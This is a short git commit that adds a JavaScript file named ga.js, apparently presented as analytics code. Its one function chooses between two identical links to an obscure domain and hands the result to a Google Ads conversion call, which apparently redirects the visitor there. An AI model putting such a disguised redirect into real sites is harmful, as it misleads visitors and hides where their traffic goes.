9473b94cf65cb18e1b9390387fdc198bb37f2b9d
yuansn23 <qwerty2015009@gmail.com>
2025-07-02 19:57:47 +0800

    Add files via upload

---
+++ js/ga.js
@@ -0,0 +1,11 @@
+﻿function showline() {
+
+	var randomNumber = Math.floor(Math.random() * 2);
+	var urls = [
+		'https://kqotvy.one/ht147',
+		'https://kqotvy.one/ht147'
+	];
+	var selectedUrl = selectedUrl = urls[randomNumber];
+
+	gtag_report_conversion(selectedUrl);
+}
